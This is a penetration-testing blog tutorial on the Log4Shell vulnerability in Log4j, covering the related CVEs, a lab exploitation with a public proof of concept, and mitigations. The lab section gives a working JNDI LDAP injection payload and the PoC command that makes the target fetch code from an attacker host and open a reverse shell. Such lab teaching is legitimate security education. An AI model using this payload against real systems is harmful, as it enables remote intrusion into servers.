<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">A Detailed Guide on Log4J Penetration Testing</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-log4j-penetration-testing/" rel="bookmark"><time class="entry-date published" datetime="2021-12-18T20:50:36+00:00">December 18, 2021</time><time class="updated" datetime="2024-12-11T14:05:23+00:00">December 11, 2024</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to discuss and demonstrate in our lab setup, the exploitation of the new vulnerability identified as <strong>CVE-2021-44228</strong> affecting the java logging package, <strong>Log4J.</strong> This vulnerability has a severity <strong>score of 10.0</strong>, most critical designation and offers remote code execution on hosts engaging with software that uses log4j utility. This attack has also been called <strong>“Log4Shell”.</strong></span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ol>
<li><span style="color: #000000;">Log4jShell</span></li>
<li><span style="color: #000000;">What is log4j</span></li>
<li><span style="color: #000000;">What is LDAP and JNDI</span></li>
<li><span style="color: #000000;">LDAP and JNDI Chemistry</span></li>
<li><span style="color: #000000;">Log4j JNDI lookup</span></li>
<li><span style="color: #000000;">Normal Log4j scenario</span></li>
<li><span style="color: #000000;">Exploit Log4j scenario</span></li>
<li><span style="color: #000000;">Pentest Lab Setup</span></li>
<li><span style="color: #000000;">Exploiting Log4j (CVE-2021-44228)</span></li>
<li><span style="color: #000000;">Mitigation</span></li>
</ol>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Log4jshell</span> </strong></span></h3>
<p><span style="color: #800000;"><strong><u>CVE-2021-44228</u></strong></span></p>
<p><span style="color: #000000;"><strong>Description: </strong>Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in the configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.</span></p>
<p><span style="color: #000000;"><strong>Vulnerability Type</strong>          Remote Code Execution</span></p>
<p><span style="color: #000000;"><strong>Severity               </strong>                Critical</span></p>
<p><span style="color: #000000;"><strong>Base CVSS Score</strong>               10.0</span></p>
<p><span style="color: #000000;"><strong>Versions Affected           </strong>All versions from 2.0-beta9 to 2.14.1</span></p>
<p><span style="color: #800000;"><strong><u>CVE-2021-45046</u></strong></span></p>
<p><span style="color: #000000;">It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data using a JNDI Lookup pattern, resulting in an information leak and remote code execution in some environments and local code execution in all environments; remote code execution has been demonstrated on macOS but no other tested environments.</span></p>
<p><span style="color: #000000;"><strong>Vulnerability Type</strong>          Remote Code Execution</span></p>
<p><span style="color: #000000;"><strong>Severity               </strong>                Critical</span></p>
<p><span style="color: #000000;"><strong>Base CVSS Score</strong>               9.0</span></p>
<p><span style="color: #000000;"><strong>Versions Affected</strong>           All versions from 2.0-beta9 to 2.15.0, excluding 2.12.2</span></p>
<p><span style="color: #800000;"><strong><u>CVE-2021-45105</u></strong></span></p>
<p><span style="color: #000000;">Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process. This is also known as a DOS (Denial of Service) attack.</span></p>
<p><span style="color: #000000;"><strong>Vulnerability Type</strong>          Denial of Service</span></p>
<p><span style="color: #000000;"><strong>Severity               </strong>                High</span></p>
<p><span style="color: #000000;"><strong>Base CVSS Score</strong>               7.5</span></p>
<p><span style="color: #000000;"><strong>Versions Affected</strong>           All versions from 2.0-beta9 to 2.16.0</span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">What is Log4J.</span> </strong></span></h3>
<p><span style="color: #000000;">Log4j is a Java-based logging utility that is part of the Apache Logging Services. Log4j is one of the several Java logging frameworks which is popularly used by millions of Java applications on the internet.</span></p>
<h3><span style="color: #800000;"><strong>What is LDAP and JNDI</strong></span></h3>
<p><span style="color: #000000;"><strong>LDAP</strong> (Lightweight Directory Access Protocol) is an open and cross-platform protocol that is used for directory service authentication. It provides the communication language that the application uses to communicate with other directory services. Directory services store lots of important information like, user accounts details, passwords, computer accounts, etc which are shared with other devices on the network.</span></p>
<p><span style="color: #000000;"><strong>JNDI</strong> (Java Naming and Directory Interface) is an application programming interface (API) that provides naming and directory functionality to applications written using Java Programming Language.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgOQnlSvaNMkYa_9XbBIVRzY3gAZO02Tiazjt-WHurkASyfAbapM8rZLIUp9BePvjq-JC2m2nXVX_P6uFVmzsk7pzN9GKxI0wxnzTbU1gS9DrZ-6p89rzFss7OkjN2lVaCvb5korXeNOxJxP5t_917AmPr6HkmTtUl7u0pFC2kMHcIvr4Y83cQ64hhXCQ=s16000"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">JNDI and LDAP Chemistry</span> </strong></span></h3>
<p><span style="color: #000000;">JNDI provides a standard API for interacting with name and directory services using a service provider interface (SPI). JNDI provides Java applications and objects with a powerful and transparent interface to access directory services like LDAP. The table below shows the common LDAP and JNDI equivalent operations.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEixvoVo98WtFTc0cozpeknfsNbnEQ6SiaoXw8Q1v7h-YkK6sOMHhwh4V-KmFJoZZzirKqper8PAusLSjIAs9n2ToD9jnspJUaHxqcok0vvjHLarXM_JR4fNhLPm_f5g-qhsWdD3VPYQ3-RoFpYs3ZFn6IQsVTNT1iJb9kETas9T1gzgA-Ljtsj8hrYi4Q=s16000"/></span></p>
<h3><span style="color: #800000;"><strong>Log4J JNDI Lookup</strong></span></h3>
<p><span style="color: #000000;">Lookups are a kind of mechanism that add values to the log4j configuration at arbitrary places. Log4j has the ability to perform multiple lookups such as map, system properties and JNDI (Java Naming and Directory Interface) lookups.</span></p>
<p><span style="color: #000000;">Log4j uses the JNDI API to obtain naming and directory services from several available service providers: <strong>LDAP, COS (Common Object Services), Java RMI registry (Remote Method Invocation), DNS (Domain Name Service),</strong> etc. if this functionality is implemented, then we should this line of code somewhere in the program: <strong>${jndi:logging/context-name}</strong></span></p>
<p><span style="color: #000000;"><strong>A Normal Log4J Scenario</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjjRJfgfugQqnMhK2bvwSaURO2kLn9OiUSZYLCVPte_bygG_sqdupugk90QxmJsVRXw85l-uhM_4C4Looo1-BpbpMHH3CxAWQsVr_yyoyllFuTKryCjxgRBVJW2hdz0MN0r9YZPpbEmogkv82Dbn01P9qqs8HmjdSxCvDO08DK7dWhR4FbavyC3pDy4nA=s16000"/></span></p>
<p><span style="color: #000000;">The above diagram shows a normal log4j scenario.</span></p>
<h3><span style="color: #800000;"><strong>Exploit Log4j Scenario</strong></span></h3>
<p><span style="color: #000000;">An attacker who can control log messages or log messages parameters can execute arbitrary code on the vulnerable server loaded from LDAP servers when message lookup substitution is enabled. As a result, an attacker can craft a special request that would make the utility remotely downloaded and execute the payload.</span></p>
<p><span style="color: #000000;"> Below is the most common example of it using the combination of JNDI and LDAP:<strong> ${jndi:ldap://&lt;host&gt;:&lt;port&gt;/&lt;payload&gt;}</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEidEMI1h0RBjhmu1XX4W9I6SDgun-awCxYc-AdufginA1EuM0ZWeQYwWmFOI4lxoDgLEfJ76NkqOAFJCR36HoYpoaaHyM1lZgUuiShruKCt1dyJx_fqkIpiGx5jOMwhvDDv1IuLuTZYBvItGJQTF5uPqJnDH_4AyPps51NBMnvkp9H3R_hJ5sTAJFYttA=s16000"/></span></p>
<ol>
<li><span style="color: #000000;">An attacker inserts the JNDI lookup in a header field that is likely to be logged.</span></li>
<li><span style="color: #000000;">The string is passed to log4j for logging.</span></li>
<li><span style="color: #000000;">Log4j interpolates the string and queries the malicious LDAP server.</span></li>
<li><span style="color: #000000;">The LDAP server responds with directory information that contains the malicious Java Class.</span></li>
<li><span style="color: #000000;">Java deserialize (or download) the malicious Java Class and executes it.</span></li>
</ol>
<h3><span style="color: #800000;"><strong>Pentest Lab Setup</strong></span></h3>
<p><span style="color: #000000;">In the lab setup, we will use Kali VM as the attacker machine and Ubuntu VM as the target machine. So let’s prepare the ubuntu machine. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/kozmer/log4j-shell-poc.git</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiz9YBroEqpp0tEMmcYj7iIU8-lhOJXCSL8qGo_cdpyCDHO2z9OguOeS6TKGeklAzhXuMYGF2kOcAI71jLZ-V1sp4p9PBEOR-knZBA3yJxhw7WHOkmeJCkSvlvYDN5LZLoPIlZ_J8GJO60VPEWSGm7-lvHD5Jm2mz3FCyRJQ3kDLVZYctA9LSMCTp_Plg=s16000"/></span></p>
<p><span style="color: #000000;">Once the git clone command has been completed, browse to the log4j-shell-poc directory: Once inside that directory, we can now execute the docker command: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd log4j-shell-poc
docker build -t log4j-shell-poc .</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhfG-eMKNkLO0u-QS8BieI9RJfUdKe1f8F82ooq7IQoFlXvCEX5BoaENV-4B3no6VMozRMXiNj-cCILeJNDiIFFoVARHct4XU2Lv1bEUNm1Tn8GW74JDwwq0lAxuL7uFPg74IsYTMxMSrCp8k7CTRBISMeVejwQK9rQq8V_DhpeBtGa1Akx6wFRfimr4g=s16000"/></span></p>
<p><span style="color: #000000;">After that, run the second command on the github page: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run --network host log4j-shell-poc</pre>
<p><span style="color: #000000;">These commands will enable us to use the docker file with a vulnerable app.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg6oylSPHEz2ZrD_1mVw6i8E65s0GmYLByUHohMgWHhicDtpRdBulgww-QKvRcgXUy4ysEQQT_IiSGiPx0rmlOpywX9ENuikUvEsppAirEva-DI42mkjvAKnBSHK-qK3P0Pfo69-jTwBNgimDlt2-xYHI_x16UDlbXG601_Cd708KsH2oLuOyYGgKdFMg=s16000"/></span></p>
<p><span style="color: #000000;">Once completed, we have our vulnerable webapp server ready. </span><span style="color: #000000;">Now let’s browse to the target IP address in our kali’s browser at port <strong>8080</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjq-2xFO4Ji2yR0JnpncUgfQXxQr7T0oOLcB1mhfWeFPbwmcy8p2uTTIYQWhlNz4AIxNtmgqMNsjrEPG_T-o6M95lW9190j5PkJMv4eFN9oCEtPHx-og8YXpSaAlSN-QNnDsg4ywia80wE8Dr64eyA0UjeTtNOf0cZWlZJE0cmLS2fs35U2TYuPav_NJw=s16000"/></span></p>
<p><span style="color: #000000;">So, this is the docker vulnerable application and the area which is affected by this vulnerability is the username field. It is here that we are going to inject our payload. So now, the lab setup is done. We have our vulnerable target machine up and running. Time to perform the attack.</span></p>
<h3><span style="color: #800000;"><strong>Exploiting Log4j (CVE-2021-44228)</strong></span></h3>
<p><span style="color: #000000;">On the kali machine, we need to git clone the same repository. So type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/kozmer/log4j-shell-poc.git</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgrQAMs8GiS5_OAzpA5Z6Jmz8uDW6KiXiHF85x5pUwK9saKR8NO6K7E6oY6m6hPzkaIZNogreRUNFVP8-juULZPWzBFRCRg7rdnYXEUIycBwWM0d9QKTF9hMIb1f3P-JDTQ2QcMPZseFB4xy3wLUgj5Ma9-FHCHLEQfJidvpZISy8F8gv_e1gixAzaYQw=s16000"/></span></p>
<p><span style="color: #000000;">Now we need to install the JDK version. This can be downloaded at the following link.</span></p>
<p><span style="color: #000000;"><strong>https://mirrors.huaweicloud.com/java/jdk/8u202-b08/</strong></span></p>
<p><span style="color: #000000;">Click on the correct version and download that inside the Kali Linux.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj-kB_-nH_g3MMzwTQjqXGGKD3F0SVU9myzTg-IDQB3UlDXwzySyGjn94QOfmGYSPaUHNCbq0X6p6fuJeSBL-GXtSClZQpQIe4yhpOf3gLlxwyh3abfwuNAgbmROke0A1m5D_TQ-IDBd8uon5iYxM0PdlLrJogR3gBMHne321m4lSzRrvPbOHN4MeXDHg=s16000"/></span></p>
<p><span style="color: #000000;">Now go to the download folder and unzip that file by executing the command then move the extracted file to the /usr/bin folder</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tar -xf jdk-8u202-linux-x64.tar.gz
mv jdk-8u202 /usr/bin
cd /usr/bin</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiiFs2kREegzw-qqMU2kV5Dei0pS5em_oDbCXPHbHMjdKuSkFy0N_OtLwBEU8J9amZ1bahYTuGmBc8oo4M4m_innx_YKuhdCGA7ypHGGkln6W9B0RwqZd_8WT5Pa7bzjoBXjDlciUZOgZZxeeQjVd_5s1sWtU5L0f66U_zyuZpPtfx1Zba_xM0JJesvhQ=s16000"/></span></p>
<p><span style="color: #000000;">Once verified, let’s exit from this directory and browse to the <strong>log4j-shell-poc</strong> directory. That folder contains a python script,<strong> poc.py</strong> which we are going to configure as per our lab setup settings. Here you need to modify ‘<strong>./jdk1.8.2.20/</strong>’ to ‘<strong>/usr/bin/jdk1.8.0_202/</strong> as highlighted. what we have done here is we have to change the path of the java location and the java version in the script.</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgaPVvub9rwKmx4hQ1m9_aNSh_HnbYb79klNtuSiw7j-DOic6k4uFLx-LQI7CFLp8J8KqSkG711-PTKLFMY8KGhoHI9mVdatwbu3gW6PtR0PxOI_LBn12QnwC-60AEsxUJGCyHsUupjwmZdSCOXaJVCJ_an7YlWknhdvKCD1z8dtqtwW3RACyS93YUjRQ=s16000"/></p>
<p><span style="color: #000000;">Now that all changes have been made, we need to save the file and get ready to start the attack. In attacker machine, that is the Kali Linux, we will access the docker vulnerable webapp application inside a browser by typing the IP of the ubuntu machine:8080</span></p>
<p><span style="color: #000000;">Now let’s initiate a netcat listener and start the attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEig0sLXy4Tzk52oCUKcnt57OgpkMcxyJqOubDGExUISZ3LDaqrG0PcOoGy4XKhS-qcLSyLctj_dkxm98Ga2pWuqTMkl8eRDWU9CxGoC9ZPe4sJz4pOX5oHRUNwMQ19yu8y5SFzPBf3t8dK5NzdEKBPNVMAfr5KfdG4eeHq642BljHJbOW-0gBZ_gdQU9A=s16000"/></span></p>
<p><span style="color: #000000;">Type the following command </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 poc.py --userip 192.168.29.163 --webport 8000 --lport 9001</pre>
<p><span style="color: #000000;">in a terminal. Make sure you are in the log4j-shell-poc directory when executing the command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiarK268hBuH7J1-jl8X8EVvMpg7PYZlpOZHY8YzeGpUebfw4d-qScofSvkv2EYGyObcB7gBoniu3Cig-_i4EictJH_s9lKIgkKd1rNDLyGs4rkf2hNp7U1415j4qc7Puwb-RUwRd4e7rtVsqBNK6nV-disuSJPAgE4t0NgtQF4oXEpjl8grgEPg7lWKg=s16000"/></span></p>
<p><span style="color: #000000;">This script started the malicious local LDAP server.</span></p>
<p><span style="color: #000000;">Now let </span><span style="color: #000000;">Copy the complete command after send me: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">${jndi:ldap://192.168.29.163:1389/a}</pre>
<p><span style="color: #000000;">paste it inside the browser in the username field. This will be our payload. In the password field, you can provide anything.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhAdQl_O-rdemi_dQx-ok4O9HuEU2nyMRQyelumL2pFXYy1QQ8531Mv8giLb4Qxr811L1vo9YE8mC7tl-SUTmKtGqDRht3xGP6dAWEZ0Pxj55pFLCX8DKthZrx78sJcvVaeFpvJpPLcoJW5UjQ6yYOvrRXWAcNB98WCIv72tWn0b0Jp3Ab12Z6h8lw8gw=s16000"/></span></p>
<p><span style="color: #000000;">Click on the login button to execute the payload. Then switch to the netcat windows where we should get a reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjF3wNOYmoFhs_PCcPj4We37Ps-bUsRxZGt-DCjax18sTMRQA0ufYRPoavAEomKY7c-FLfikHQNvk8-hcQqlzfGhv1p_6mmWrd_b7z5PfQAvfJ71N39fTlKiCQFFe3RtCw_hIzANeoHSaeaDsb5QhlF_wdOUIUU0lz6LGhxxlt6pklEKdTNShFuhD58qA=s16000"/></span></p>
<p><span style="color: #000000;">We are finally inside that vulnerable webapp docker image.</span></p>
<h3><span style="color: #800000;"><strong>Mitigation</strong></span></h3>
<p><span style="color: #000000;"><strong>CVE-2021-44228:</strong> <strong>Fixed in Log4j 2.15.0 (Java 8)</strong></span></p>
<p><span style="color: #000000;">Implement one of the following mitigation techniques:</span></p>
<ul>
<li><span style="color: #000000;">Java 8 (or later) users should upgrade to release 2.16.0.</span></li>
<li><span style="color: #000000;">Java 7 users should upgrade to release 2.12.2.</span></li>
<li><span style="color: #000000;">Otherwise, in any release other than 2.16.0, you may remove the JndiLookup class from the classpath: <strong>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</strong></span></li>
<li><span style="color: #000000;">Users are advised not to enable JNDI in Log4j 2.16.0. If the JMS Appender is required, use Log4j 2.12.2</span></li>
</ul>
<p><span style="color: #000000;"><strong>CVE-2021-45046:</strong> <strong>Fixed in Log4j 2.12.2 (Java 7) and Log4j 2.16.0 (Java 8)</strong></span></p>
<p><span style="color: #000000;">Implement one of the following mitigation techniques:</span></p>
<ul>
<li><span style="color: #000000;">Java 8 (or later) users should upgrade to release 2.16.0.</span></li>
<li><span style="color: #000000;">Java 7 users should upgrade to release 2.12.2.</span></li>
<li><span style="color: #000000;">Otherwise, in any release other than 2.16.0, you may remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span></li>
<li><span style="color: #000000;">Users are advised not to enable JNDI in Log4j 2.16.0. If the JMS Appender is required, use Log4j 2.12.2.</span></li>
</ul>
<p><span style="color: #000000;"><strong>CVE-2021-45105:</strong> <strong>Fixed in Log4j 2.17.0 (Java 8)</strong></span></p>
<p><span style="color: #000000;">Implement one of the following mitigation techniques:</span></p>
<ul>
<li><span style="color: #000000;">Java 8 (or later) users should upgrade to release 2.17.0.</span></li>
<li><span style="color: #000000;">In PatternLayout in the logging configuration, replace Context Lookups like ${ctx:loginId} or $${ctx:loginId} with Thread Context Map patterns (%X, %mdc, or %MDC).</span></li>
<li><span style="color: #000000;">Otherwise, in the configuration, remove references to Context Lookups like ${ctx:loginId} or $${ctx:loginId} where they originate from sources external to the application such as HTTP headers or user input.</span></li>
</ul>
<p><span style="color: #000000;">To read more about mitigation, you can access the following  link <strong><a style="color: #000000;" href="https://logging.apache.org/log4j/2.x/index.html">https://logging.apache.org/log4j/2.x/security.html</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Tirut Hawoldar is a Cyber Security Enthusiast and CTF player with 15 years of experience in IT Security and Infrastructure. Can be Contacted on <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/tirut-hawoldar-72b67214/"><strong>LinkedIn</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/" title="A Detailed Guide on Wfuzz">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Wfuzz</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/crunch-wordlist-generation-guide/" title="A Detailed Guide on Crunch">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Crunch</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/digital-world-local-fall-vulnhub-walkthrough/" rel="prev">digital world.local: FALL Vulnhub Walkthrough</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/digital-world-local-vengeance-vulnhub-walkthrough/" rel="next">digital world.local: Vengeance Vulnhub Walkthrough</a></div></div>
	</nav>        </div>
